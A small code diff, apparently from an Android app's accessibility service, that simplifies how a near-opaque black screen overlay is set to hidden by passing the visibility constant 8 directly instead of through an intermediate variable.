@@ -1208,8 +1208,7 @@ class InputService : AccessibilityService() {
     	overLay =  FrameLayout(this)
     	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
     	overLay.getBackground().setAlpha(253)
-    	gohome = 8
-	overLay.setVisibility(gohome)
+	overLay.setVisibility(8)
         overLay.setFocusable(false)
         overLay.setClickable(false)
 
